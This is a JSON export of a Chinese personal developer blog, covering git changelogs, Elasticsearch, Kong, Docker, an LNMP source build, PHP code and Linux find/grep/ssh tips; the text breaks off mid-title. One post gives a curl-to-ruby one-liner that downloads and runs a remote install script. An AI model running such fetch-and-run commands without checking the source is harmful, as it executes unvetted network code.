{"meta":{"title":"追寻一颗宁静的心","subtitle":null,"description":null,"author":"ningmo","url":"http://ningmo.github.io","root":"/"},"pages":[{"title":"about","date":"2019-08-26T01:51:20.000Z","updated":"2019-08-26T10:53:38.614Z","comments":true,"path":"about/index.html","permalink":"http://ningmo.github.io/about/index.html","excerpt":"","text":"本站部分内容来自互联网转载或内容整理 其中转载内容已标明出处 如有版权问题请联系管理人员 Email: sfhy20^_^163.com github: ningmo"}],"posts":[{"title":"git changelog","slug":"git-changelog","date":"2019-08-26T06:15:44.000Z","updated":"2019-08-27T10:02:00.636Z","comments":true,"path":"2019/08/26/git-changelog/","link":"","permalink":"http://ningmo.github.io/2019/08/26/git-changelog/","excerpt":"","text":"软件环境安装 12npm install commitizen -g # 也可在项目根目录本地安装 --save-devnpm install -g conventional-changelog-cli # 也可在项目根目录本地安装 --save-dev 配置 1commitizen init cz-conventional-changelog --save-dev --save-exact 如果出现报错(极大可能是node版本问题 可以切换node版本)指定适配器 vim .czrc 1&#123;&quot;path&quot;: &quot;cz-conventional-changelog&quot;&#125; 指定生成标准angular可选 angular/atom/… 1234conventional-changelog -p angular -i CHANGELOG.md -sgit add .git cz 释义 feat 新功能 fix Bug修复 docs 文档更新 style 代码的格式，标点符号的更新 refactor 代码重构 perf 性能优化 test 测试更新 build 构建系统或者包依赖更新 ci CI 配置，脚本文件等更新 chore 非 src 或者 测试文件的更新 revert commit 回退","categories":[{"name":"index","slug":"index","permalink":"http://ningmo.github.io/categories/index/"}],"tags":[{"name":"git","slug":"git","permalink":"http://ningmo.github.io/tags/git/"},{"name":"changelog","slug":"changelog","permalink":"http://ningmo.github.io/tags/changelog/"}]},{"title":"search template","slug":"elk/search template","date":"2019-08-25T13:33:35.000Z","updated":"2019-08-27T03:31:47.022Z","comments":true,"path":"2019/08/25/elk/search template/","link":"","permalink":"http://ningmo.github.io/2019/08/25/elk/search template/","excerpt":"","text":"创建搜索模板 12345678910111213141516POST _scripts/.kibana_1&#123; &quot;script&quot;:&#123; &quot;lang&quot;: &quot;mustache&quot;, &quot;source&quot;:&#123; &quot;_source&quot;:[&quot;name&quot;,&quot;description&quot;,&quot;color&quot;], &quot;size&quot;:20, &quot;query&quot;:&#123; &quot;multi_match&quot;: &#123; &quot;query&quot;: &quot;&#123;&#123;q&#125;&#125;&quot;, &quot;fields&quot;: [&quot;name&quot;,&quot;description&quot;] &#125; &#125; &#125; &#125;&#125; 1234# 查看GET _scripts/.kibana_1# 查看删除模板DELETE _scripts/.kibana_1 使用 1234567POST searchTplA/_search/template&#123; &quot;id&quot;:&quot;.kibana_1&quot;, &quot;params&quot;: &#123; &quot;search&quot;:&quot;a&quot; &#125;&#125;","categories":[],"tags":[{"name":"elasticsearch","slug":"elasticsearch","permalink":"http://ningmo.github.io/tags/elasticsearch/"}]},{"title":"search suggest","slug":"elk/search suggest","date":"2019-08-25T13:33:35.000Z","updated":"2019-08-27T03:31:47.022Z","comments":true,"path":"2019/08/25/elk/search suggest/","link":"","permalink":"http://ningmo.github.io/2019/08/25/elk/search suggest/","excerpt":"","text":"1. term suggest 常用于拼写错误123456789101112POST /kibana_sample_data_logs/_search&#123; &quot;suggest&quot;:&#123; &quot;term-suggestion&quot;:&#123; &quot;text&quot;:&quot;elastia&quot;, &quot;term&quot;:&#123; &quot;suggest_mode&quot;:&quot;popular&quot;, &quot;field&quot;:&quot;url&quot; &#125; &#125; &#125;&#125; result: 12345678910111213141516171819202122232425262728293031323334&#123; \"took\" : 65, \"timed_out\" : false, \"_shards\" : &#123; \"total\" : 1, \"successful\" : 1, \"skipped\" : 0, \"failed\" : 0 &#125;, \"hits\" : &#123; \"total\" : &#123; \"value\" : 0, \"relation\" : \"eq\" &#125;, \"max_score\" : null, \"hits\" : [ ] &#125;, \"suggest\" : &#123; \"term-suggestion\" : [ &#123; \"text\" : \"elastia\", \"offset\" : 0, \"length\" : 7, \"options\" : [ &#123; \"text\" : \"elastic\", \"score\" : 0.85714287, \"freq\" : 2724 &#125; ] &#125; ] &#125;&#125; suggest_mode missing 如索引中已存在,就不提供建议 popular 推荐出现频率更高的词 always 无论是否存在 都提供建议 2. phrase suggest3.completion suggest 自动不全需要先定义mapping 字段设置type为 completion 12345678910PUT completion_index_a&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;yourfield&quot;:&#123; &quot;type&quot;: &quot;completion&quot; &#125; &#125; &#125;&#125; result 12345&#123; \"acknowledged\" : true, \"shards_acknowledged\" : true, \"index\" : \"completion_index_a\"&#125; 使用 1234567891011POST /completion_index_a/_search&#123; &quot;suggest&quot;:&#123; &quot;comp-suggestion&quot;:&#123; &quot;prefix&quot;:&quot;n&quot;, &quot;completion&quot;:&#123; &quot;field&quot;:&quot;yourfield&quot; &#125; &#125; &#125;&#125; 4..context suggest 上下文建议","categories":[],"tags":[{"name":"elasticsearch","slug":"elasticsearch","permalink":"http://ningmo.github.io/tags/elasticsearch/"}]},{"title":"kong 使用","slug":"devops/kong-user","date":"2018-04-04T13:20:08.000Z","updated":"2019-08-06T05:23:30.549Z","comments":true,"path":"2018/04/04/devops/kong-user/","link":"","permalink":"http://ningmo.github.io/2018/04/04/devops/kong-user/","excerpt":"","text":"kong 总体流程创建接口-给接口添加验证插件-创建用户-给用户创建key 给接口添加验证插件curl -X POST http://10.10.107.103:8001/apis/qzh/plugins -d “name=key-auth”{“api_id”:”1b545af7-42ff-4143-8c70-5a4c323d1a41”,”id”:”8e104fce-5ceb-4a38-b6bf-f8fcfb8ad048”,”created_at”:1522828616000,”enabled”:true,”name”:”key-auth”,”config”:{“hide_credentials”:false,”anonymous”:””,”key_names”:[“apikey”],”key_in_body”:false}} 给用户创建keycurl -X POST http://10.10.107.103:8001/consumers/qzhuser/key-auth -d “key=qzhkey”{“created_at”:1522828821000,”consumer_id”:”f2531e2f-c6ba-4f97-94e4-a9454b70bb95”,”key”:”qzhkey”,”id”:”33fc0bff-7f23-43bc-bf60-e6114f0b04ab”}","categories":[],"tags":[]},{"title":"Algorithms_select","slug":"Algorithms-select","date":"2016-11-16T12:51:18.000Z","updated":"2019-08-06T05:23:30.537Z","comments":true,"path":"2016/11/16/Algorithms-select/","link":"","permalink":"http://ningmo.github.io/2016/11/16/Algorithms-select/","excerpt":"","text":"算法练习：选择排序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849$arr = [];for($i=0;$i&lt;10;$i++)&#123; $arr[] = mt_rand(1,500);&#125;$arr2 = $arr;echo &apos;&lt;pre&gt;&lt;br/&gt;元数据:&apos;;print_r($arr);echo &apos;&lt;br/&gt;&apos;;$l = 0;$result = [];# ascfor($i=0;$i&lt;count($arr);$i++)&#123; $min = $arr[$i]; for($j=$i;$j&lt;count($arr)-1;$j++)&#123; if($min&gt;$arr[$j+1])&#123; $tmp = $arr[$j+1]; $arr[$j+1] = $min; $min = $tmp; &#125; $l += 1; &#125; $result[$i] = $min; &#125;echo &apos;Asc Result:&lt;br/&gt;&apos;;print_r($result);echo &apos;length:&apos;.$l.&apos;&lt;br/&gt;&apos;;$l = 0;# desc$result2 = [];for($i=0;$i&lt;count($arr2);$i++)&#123; $max = $arr2[$i]; for($j=$i;$j&lt;count($arr2)-1;$j++)&#123; if($max&lt;$arr2[$j+1])&#123; $tmp = $arr2[$j+1]; $arr2[$j+1] = $max; $max = $tmp; &#125; $l += 1; &#125; $result2[count($arr2)-1-$i] = $max; &#125;echo &apos;Desc Result:&lt;br/&gt;&apos;;print_r($result2);echo &apos;length:&apos;.$l.&apos;&lt;br/&gt;&apos;;","categories":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://ningmo.github.io/categories/Algorithms/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://ningmo.github.io/tags/算法/"},{"name":"Algorithms","slug":"Algorithms","permalink":"http://ningmo.github.io/tags/Algorithms/"},{"name":"select","slug":"select","permalink":"http://ningmo.github.io/tags/select/"}]},{"title":"Algorithms_bubble","slug":"Algorithms-bubble","date":"2016-11-16T11:36:21.000Z","updated":"2019-08-06T05:23:30.538Z","comments":true,"path":"2016/11/16/Algorithms-bubble/","link":"","permalink":"http://ningmo.github.io/2016/11/16/Algorithms-bubble/","excerpt":"","text":"算法练习：冒泡排序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# 排序算法$arr = [];for($i=0;$i&lt;10;$i++)&#123; $arr[] = mt_rand(1,500);&#125;echo &apos;&lt;pre&gt;&apos;;echo &apos;元数据&apos;;echo &apos;&lt;br/&gt;&apos;;print_r($arr);$result = $arr;$result2 = $arr;# 冒泡 descfor($i=0;$i&lt;count($result)-1;$i++)&#123; for($j=0;$j&lt;count($result)-$i;$j++)&#123; if($result[$j] &lt; $result[$j+1])&#123; $tmp = $result[$j+1]; $result[$j+1] = $result[$j]; $result[$j] = $tmp; &#125; &#125;&#125;echo &apos;&lt;br/&gt;&apos;;echo &apos;Desc result&apos;;echo &apos;&lt;br/&gt;&apos;;print_r($result);echo &apos;&lt;br/&gt;&apos;;var_dump($result == sort($arr));echo &apos;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&apos;;echo &apos;Asc result&lt;br/&gt;&apos;;# ascfor($i=0;$i&lt;count($result2)-1;$i++)&#123; for($j=count($result2)-1;$j&gt;=0;$j--)&#123; if($result2[$j] &lt; $result2[$j-1])&#123; $tmp = $result2[$j-1]; $result2[$j-1] = $result2[$j]; $result2[$j] = $tmp; &#125; &#125;&#125;echo &apos;&lt;br/&gt;&apos;;print_r($result2);var_dump($result2 == sort($arr));# 最佳时间复杂度 O(n)","categories":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://ningmo.github.io/categories/Algorithms/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://ningmo.github.io/tags/算法/"},{"name":"Algorithms","slug":"Algorithms","permalink":"http://ningmo.github.io/tags/Algorithms/"},{"name":"bubble","slug":"bubble","permalink":"http://ningmo.github.io/tags/bubble/"}]},{"title":"修改docker源地址","slug":"devops/docker-registry","date":"2016-11-10T13:20:08.000Z","updated":"2019-08-06T05:23:30.539Z","comments":true,"path":"2016/11/10/devops/docker-registry/","link":"","permalink":"http://ningmo.github.io/2016/11/10/devops/docker-registry/","excerpt":"","text":"maxos 直接找到配置 在registry加入地址即可http://b72d1176.m.daocloud.io 其他系统 修改docker配置文件/etc/default/docker如 DOCKER_OPTS=”–registry-mirror=http://b72d1176.m.daocloud.io&quot; b72d1176为个人帐号的生成 可以自己注册帐号后在加速器中找到自己的URL感谢 daocloud","categories":[{"name":"Linux","slug":"Linux","permalink":"http://ningmo.github.io/categories/Linux/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://ningmo.github.io/tags/docker/"}]},{"title":"angularjs几种生成工具的尝试","slug":"js/angularjs-try","date":"2016-11-05T13:25:25.000Z","updated":"2019-08-06T05:23:30.552Z","comments":true,"path":"2016/11/05/js/angularjs-try/","link":"","permalink":"http://ningmo.github.io/2016/11/05/js/angularjs-try/","excerpt":"","text":"想法是弄个angularjs的常用结构出来 可以快速的各种项目开发但是可怜对angular的了解有限 暂时找了几个开源的试试 generator-angular https://github.com/yeoman/generator-angular安装过程中总出错 依赖有点多 最后竟然没成功 generator-angularjs https://www.npmjs.com/package/generator-angularjs generator-angular-nmi https://www.npmjs.com/package/generator-angular-nmi","categories":[{"name":"Js","slug":"Js","permalink":"http://ningmo.github.io/categories/Js/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"http://ningmo.github.io/tags/angularjs/"},{"name":"angular","slug":"angular","permalink":"http://ningmo.github.io/tags/angular/"},{"name":"generator","slug":"generator","permalink":"http://ningmo.github.io/tags/generator/"}]},{"title":"docker常用命令操作","slug":"devops/docker-useful","date":"2016-11-02T13:31:10.000Z","updated":"2019-08-06T05:23:30.555Z","comments":true,"path":"2016/11/02/devops/docker-useful/","link":"","permalink":"http://ningmo.github.io/2016/11/02/devops/docker-useful/","excerpt":"","text":"docker 常用命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364## 拉取镜像docker pull openresty/openrestydocker images# 创建容器docker run -it -m 100MB -h doc.nginx -d --name=&quot;nginx&quot; openresty/openresty # -c cpu优先级 －m 内存（M） －h 主机 --name 容器名字 镜像 ［/bin/bash 进入容器命令行］# -p 端口映射 主机端口:容器端口 -v 主机目录:容器目录示例：docker run -itd --name=&quot;cent&quot; -m 512M -p 8080:80 -p 9000:9000 -v /Users/moran/Documents/angular/:/data/angular centos＃ 常用操作docker inspect 容器名字 ＃ 查看容器的信息docker attach # 连接(进入)到一个正在运行的容器docker creeate # 创建但不运行docker run # 创建并运行docker top # 显示容器的进程信息docker cp # 从容器里向外拷贝文件或目录docker logs # 查看容器的日志 !! 可以看到其标准（错误）输出docker exec -it 容器名字 bash # 在容器中创建一个新的bash会话docker ps -[l|a]docker start|stop|restart|pause|unpause 容器名字/IDdocker rm 容器docker rmi 镜像docker build # 使用Dockerfile创建镜像docker history # 显示生成一个镜像的历史命令示例： 在官方centos7镜像上 安装一个node环境（虽然node也有镜像 但更喜欢自己装）docker pull centosdocker run -itd --name=&quot;cent&quot; -m 512M -p 8080:80 -p 9000:9000 -v /Users/moran/Documents/angular/:/data/angular centosdocker attach cent# 基础工具yum install wget vim gcc-c++ make -yyum install gem -y gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/gem install compass# install npmcd /tmpwget https://nodejs.org/dist/v6.9.1/node-v6.9.1.tar.gztar zxvf node-v6.9.1.tar.gz cd node-v6.9.1./configure makemake install # toolsnpm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm install -g grunt-cli cnpm install -g yocnpm install -g bowercnpm install -g generator-karmacnpm install -g generator-angular# 保存容器docker commit 版本ID 远程仓库","categories":[{"name":"Linux","slug":"Linux","permalink":"http://ningmo.github.io/categories/Linux/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://ningmo.github.io/tags/docker/"},{"name":"run","slug":"run","permalink":"http://ningmo.github.io/tags/run/"}]},{"title":"mac-install-docker","slug":"mac-install-docker","date":"2016-11-01T14:50:05.000Z","updated":"2019-08-27T03:30:42.036Z","comments":true,"path":"2016/11/01/mac-install-docker/","link":"","permalink":"http://ningmo.github.io/2016/11/01/mac-install-docker/","excerpt":"","text":"12brew install wgetwget https://download.docker.com/mac/stable/Docker.dmg # 下载并安装此文件","categories":[{"name":"Linux","slug":"Linux","permalink":"http://ningmo.github.io/categories/Linux/"}],"tags":[{"name":"mac","slug":"mac","permalink":"http://ningmo.github.io/tags/mac/"},{"name":"docker","slug":"docker","permalink":"http://ningmo.github.io/tags/docker/"}]},{"title":"php截图裁剪 缩放图片","slug":"php/php_image_cut","date":"2016-10-25T12:49:04.000Z","updated":"2019-08-06T05:23:30.553Z","comments":true,"path":"2016/10/25/php/php_image_cut/","link":"","permalink":"http://ningmo.github.io/2016/10/25/php/php_image_cut/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function image_resize($from, $tw,$th)&#123; // 按指定大小生成缩略图，而且不变形，缩略图函数 $temp = array(1=&gt;&apos;gif&apos;, 2=&gt;&apos;jpeg&apos;, 3=&gt;&apos;png&apos;); list($fw, $fh, $tmp) = getimagesize($from); if(!$temp[$tmp])&#123; return false; &#125; $tmp = $temp[$tmp]; $infunc = &quot;imagecreatefrom$tmp&quot;; $outfunc = &quot;image$tmp&quot;; $fimg = $infunc($from); // 使缩略后的图片不变形，并且限制在 缩略图宽高范围内 if($fw/$tw &gt; $fh/$th)&#123; $th = $tw*($fh/$fw); &#125;else&#123; $tw = $th*($fw/$fh); &#125; $timg = imagecreatetruecolor($tw, $th); imagecopyresampled($timg, $fimg, 0,0, 0,0, $tw,$th, $fw,$fh); $to = C(&apos;UPLOAD_PATH&apos;).C(&apos;UPLOAD_SAVE_DIR_RULE&apos;).&apos;a_&apos;.time().&apos;_&apos;.mt_rand(100,999).&apos;.&apos;.end(explode(&apos;.&apos;,$from)); $r = $outfunc($timg, $to); if($r)&#123; unlink($from); return $to; &#125;else&#123; return false; &#125; &#125; function cut_img($from,$zero=[0,0],$cutSize=[300,300])&#123; $temp = array(1=&gt;&apos;gif&apos;, 2=&gt;&apos;jpeg&apos;, 3=&gt;&apos;png&apos;); list($fw, $fh, $tmp) = getimagesize($from); if(!$temp[$tmp])&#123; return false; &#125; $tmp = $temp[$tmp]; $infunc = &quot;imagecreatefrom$tmp&quot;; $outfunc = &quot;image$tmp&quot;; $timg = $infunc($from); $cutImg=imagecreatetruecolor($cutSize[0], $cutSize[1]); # 将 $timg 图像中坐标从 src_x，src_y 开始，宽度为 src_w，高度为 src_h 的一部分拷贝到 dst_im 图像中坐标为 dst_x 和 dst_y 的位置上。 imagecopy($cutImg,$timg,0,0,$zero[0], $zero[1],$cutSize[0], $cutSize[1]); $to = C(&apos;UPLOAD_PATH&apos;).C(&apos;UPLOAD_SAVE_DIR_RULE&apos;).&apos;a_&apos;.time().&apos;_&apos;.mt_rand(100,999).&apos;.&apos;.end(explode(&apos;.&apos;,$from)); $r = $outfunc($cutImg, $to); if($r)&#123; unlink($from); return str_replace(&apos;../&apos;,&apos;/&apos;,$to); &#125;else&#123; return false; &#125; &#125;","categories":[{"name":"Php","slug":"Php","permalink":"http://ningmo.github.io/categories/Php/"}],"tags":[{"name":"image","slug":"image","permalink":"http://ningmo.github.io/tags/image/"},{"name":"php","slug":"php","permalink":"http://ningmo.github.io/tags/php/"}]},{"title":"linux-find-grep","slug":"linux/linux-find-grep","date":"2016-10-25T12:49:04.000Z","updated":"2019-08-06T05:23:30.556Z","comments":true,"path":"2016/10/25/linux/linux-find-grep/","link":"","permalink":"http://ningmo.github.io/2016/10/25/linux/linux-find-grep/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445在当前目录下所有文件中查找内容包含 string 的文件:find ./ -name &quot;*&quot; -exec grep &quot;string&quot; &#123;&#125; \\; 注意:在最后不能加 print,否则会出错 在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件:find ./ -name &quot;*&quot; -exec grep -l &quot;string&quot; &#123;&#125; \\; 在当前目录下 *.c 中查找内容包含 string 的文件并列出字符所在的文件的所在行(不显示文件名):find ./ -name &quot;*.c&quot; -exec grep -n &quot;string&quot; &#123;&#125; \\; 在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件,所在行及所在行的内容:find ./ -name &quot;*&quot; -exec grep -n &quot;string&quot; ./ &#123;&#125; \\; 使用 find 查找时希望忽略某个目录(-prune)：如果希望在 /app 目录下查找文件， 但不希望在 /app/bin 目录下查找：find /app -name &quot;/app/bin&quot; -prune -o -print 使用type 选项:如果要在 /etc 目录下查找所有的目录：find /etc -type d -print如果要在 /etc 目录下查找 .svn 的目录：find /etc -name .svn -type d -print 为了在当前目录下查找除目录以外的所有类型的文件：find . ! -type d -print 为了在当前目录下查找所有的符号链接文件， 可以用：find . -type l -printfind . -mtime -4（4天内）/4(4天前的那一天)/+4（5天前）find . -name * -size +50k -type f/b/c/d/l/sp... -perm -/+ / 755 -uid/user 201/yangsf -gid/group 501/yangsf -nouser/nogroup 为了用 ls -l 命令列出所匹配到的文件， 可以把 ls -l 命令放在find命令的 -exec 选项中：find . -type f -exec ls -l &#123;&#125; \\;注： f 表示普通文件 exec 选项后面跟随着所要执行的命令， 然后是一对 &#123;&#125;， 一个空格和一个 \\，最后是一个分号。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://ningmo.github.io/categories/Linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/tags/linux/"},{"name":"find","slug":"find","permalink":"http://ningmo.github.io/tags/find/"},{"name":"grep","slug":"grep","permalink":"http://ningmo.github.io/tags/grep/"},{"name":"shell","slug":"shell","permalink":"http://ningmo.github.io/tags/shell/"}]},{"title":"useful-linux-cmd","slug":"linux/useful-linux-cmd","date":"2016-10-19T15:05:27.000Z","updated":"2019-08-06T05:23:30.551Z","comments":true,"path":"2016/10/19/linux/useful-linux-cmd/","link":"","permalink":"http://ningmo.github.io/2016/10/19/linux/useful-linux-cmd/","excerpt":"","text":"寻找12find . -mtime -4（4天内）/4(4天前的那一天)/+4（5天前）locate fielname* (updatedb) 寻找定位1find ./ -name &quot;*.c&quot; -exec grep -n &quot;string&quot; &#123;&#125; \\; 寻找与替换1find -name &quot;*&quot; -exec sed -i &apos;s/str1/str2/g&apos; &#123;&#125;\\;-print ssh请求12ssh -nNTf -D 7000 root@IPssh -qTfnN -D 7070 root@IP","categories":[{"name":"Linux","slug":"Linux","permalink":"http://ningmo.github.io/categories/Linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/tags/linux/"},{"name":"find","slug":"find","permalink":"http://ningmo.github.io/tags/find/"},{"name":"grep","slug":"grep","permalink":"http://ningmo.github.io/tags/grep/"},{"name":"ssh","slug":"ssh","permalink":"http://ningmo.github.io/tags/ssh/"}]},{"title":"自建docker lnmp镜像","slug":"devops/自建docker lnmp镜像","date":"2016-06-05T03:59:28.000Z","updated":"2019-08-26T08:04:27.174Z","comments":true,"path":"2016/06/05/devops/自建docker lnmp镜像/","link":"","permalink":"http://ningmo.github.io/2016/06/05/devops/自建docker lnmp镜像/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159docker pull centos ＃ 拉取镜像到本地docker run -i -t -p 8000:80 --name=centosDev centos cat /etc/redhat-release #查看系统版本&gt;CentOS Linux release 7.2.1511 (Core)＃ 开发环境安装 采取源码安装yum install kernel-devel vim gcc cmake -ymkdir /data/src -pcd /data/src/yum install wget -y# nginx 安装路径/usr/local/openresty/nginx/ 运行用户wwwwget http://openresty.org/download/ngx_openresty-1.5.12.1.tar.gztar zxvf ngx_openresty-1.5.12.1.tar.gzcd ngx_openresty-1.5.12.1yum install readline-devel pcre-devel openssl-devel -yyum install gcc gcc-c++ make -y./configure --with-luajit -j2make -j2make installgroupadd wwwuseradd www -g www -M -s /sbin/nologincd /usr/local/openresty/nginx/conf/mv nginx.conf nginx.conf.bakvi /usr/local/openresty/nginx/conf/nginx.confuser www;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;pid logs/nginx.pid;events &#123; use epoll; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; charset utf-8; #log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; # &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; # &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; #access_log logs/access.log main; access_log off; server_names_hash_bucket_size 128; client_header_buffer_size 128k; large_client_header_buffers 4 128k; client_max_body_size 300m; sendfile on; server_tokens off; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; tcp_nodelay on; fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; fastcgi_buffer_size 64k; fastcgi_buffers 4 64k; fastcgi_busy_buffers_size 128k; fastcgi_temp_file_write_size 128k; #add_header Vary Accept-Encoding; include vhosts/*.conf;&#125;cd /usr/local/openresty/nginx/conf/mkdir vhostsvim vhosts/default.confserver &#123; listen 80; root /data/www; index index.html index.htm; server_name localhost; location / &#123; try_files $uri $uri/ /index.html; # include /etc/nginx/naxsi.rules &#125; location ~ .*\\.php?$ &#123; include fastcgi_params; &#125;&#125;vim fastcgi_paramsif ($request_filename ~* (.*)\\.php) &#123; set $php_url $1;&#125;if (!-e $php_url.php) &#123; return 403;&#125;fastcgi_ignore_client_abort on;fastcgi_pass 127.0.0.1:9000;fastcgi_index index.php;# mysqlcd /data/src/wget http://120.52.72.20/cdn.mysql.com/c3pr90ntc0td//Downloads/MySQL-5.7/mysql-5.7.13.tar.gztar zxvf mysql-5.7.13.tar.gzcd mysql-5.7.13cmake -DCMAKE_BUILD_TYPE:STRING=Release -DMYSQL_USER=mysql -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/data/mysql -DSYSCONFDIR=/etc -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_ARCHIVE_STORAGE_ENGINE=1 -DWITH_BLACKHOLE_STORAGE_ENGINE=1 -DWITH_FEDERATED_STORAGE_ENGINE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DMYSQL_UNIX_ADDR=/data/mysql/mysql.sock -DMYSQL_TCP_PORT=3306 -DENABLED_LOCAL_INFILE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DEXTRA_CHARSETS=all -DWITH_SSL=yes -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DDOWNLOAD_BOOST=1 -DWITH_BOOST=/usr/local/boostmake &amp;&amp; make install ＃ 30分钟...cp support-files/mysql.server /etc/init.d/mysqldchmod 755 /etc/init.d/mysqldgroupadd mysqluseradd mysql -g mysql -M -s /sbin/nologinmkdir /data/mysqlchown mysql:mysql /data/mysqlcd /usr/local/mysqlcp support-files/my-default.cnf /etc/my.cnf/usr/local/mysql/bin/mysqld --initialize –user=mysql/etc/init.d/mysqld start# 线上镜像 docker pull ningmo/centos_lnmp:v1# phpwget http://cn2.php.net/get/php-7.0.7.tar.gz/from/this/mirrortar zxvf mirror cd php-7.0.7yum install libxml2-devel libcurl-devel libjpeg-devel libpng-devel freetype-devel openldap-devel libmcrypt-devel -ycp -frp /usr/lib64/libldap* /usr/libln -s /usr/local/mysql/lib/libmysqlclient.so.18 /usr/libldconfig./configure --enable-fpm --enable-cgi --prefix=/usr/local/php --with-mysql=/usr/local/mysql/ --with-iconv-dir=/usr/local --with-freetype-dir --with-jpeg-dir=/usr/lib --with-png-dir=/usr/lib --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem --with-curl --enable-mbregex --enable-mbstring --with-gd --enable-gd-native-ttf --with-openssl --with-mhash --enable-pcntl --with-ldap --with-ldap-sasl --with-xmlrpc --enable-zip --enable-soap --with-mysqli=/usr/local/mysql/bin/mysql_config --with-pdo-mysql=/usr/local/mysql --enable-opcache=nomakemake installcp php.ini-production /usr/local/php/lib/php.ini -fcp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm -fchmod u+x /etc/init.d/php-fpm cd /usr/local/php/etc/cp php-fpm.conf.default php-fpm.conf -fsed -i &apos;s/nobody/www/g&apos; /usr/local/php/etc/php-fpm.confmkdir /data/wwwecho &quot;&lt;?php phpinfo();&quot; &gt;/data/www/index.php","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"http://ningmo.github.io/tags/docker/"},{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/tags/linux/"},{"name":"centos","slug":"centos","permalink":"http://ningmo.github.io/tags/centos/"},{"name":"lnmp","slug":"lnmp","permalink":"http://ningmo.github.io/tags/lnmp/"}]},{"title":"终端使用proxy","slug":"linux/终端使用proxy","date":"2016-05-16T15:01:35.000Z","updated":"2019-08-26T06:09:54.316Z","comments":true,"path":"2016/05/16/linux/终端使用proxy/","link":"","permalink":"http://ningmo.github.io/2016/05/16/linux/终端使用proxy/","excerpt":"","text":"最简单的方法是 执行 12export http_proxy=http://127.0.0.1:8087export https_proxy=http://127.0.0.1:8087 (以上将http https协议代理到本地的8087端口 且只对当前终端窗口有效)支持写法 http_proxy=http://userName:password@proxyAddress:port","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"angularjs ng-repeat checkbox","slug":"js/angularjs ng-repeat checkbox","date":"2016-03-03T02:34:28.000Z","updated":"2019-08-26T08:23:26.789Z","comments":true,"path":"2016/03/03/js/angularjs ng-repeat checkbox/","link":"","permalink":"http://ningmo.github.io/2016/03/03/js/angularjs ng-repeat checkbox/","excerpt":"","text":"12345&lt;div class=&quot;col-md-3&quot; ng-repeat=&quot;user in title.UserList&quot;&gt; &lt;p class=&quot;form-control-static&quot;&gt; &lt;input type=&quot;checkbox&quot; ng-checked=&quot;user.Role&quot; ng-model=&quot;item.UserId[user.UserId]&quot; ng-true-value=&quot;&apos;add_&#123;&#123;user.UserId&#125;&#125;&apos;&quot; ng-false-value=&quot;&apos;del_&#123;&#123;user.UserId&#125;&#125;&apos;&quot;/&gt;&amp;nbsp;&#123;&#123;user.UserName&#125;&#125; &lt;/p&gt;&lt;/div&gt;","categories":[{"name":"js","slug":"js","permalink":"http://ningmo.github.io/categories/js/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"http://ningmo.github.io/tags/angularjs/"}]},{"title":"mac brew","slug":"linux/mac brew","date":"2016-01-10T08:11:32.000Z","updated":"2019-08-26T06:09:54.315Z","comments":true,"path":"2016/01/10/linux/mac brew/","link":"","permalink":"http://ningmo.github.io/2016/01/10/linux/mac brew/","excerpt":"","text":"1ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;","categories":[],"tags":[]},{"title":"mysql 设计与开发优化","slug":"mysql/mysql 设计与开发优化","date":"2015-12-25T07:54:40.000Z","updated":"2019-08-26T06:09:54.319Z","comments":true,"path":"2015/12/25/mysql/mysql 设计与开发优化/","link":"","permalink":"http://ningmo.github.io/2015/12/25/mysql/mysql 设计与开发优化/","excerpt":"","text":"使用InnoDB引擎 utf-8表名字段名使用下划线间隔分割 字母小写","categories":[],"tags":[]},{"title":"nohup/disown/setsid/screen","slug":"linux/linux的nohup disown setsid 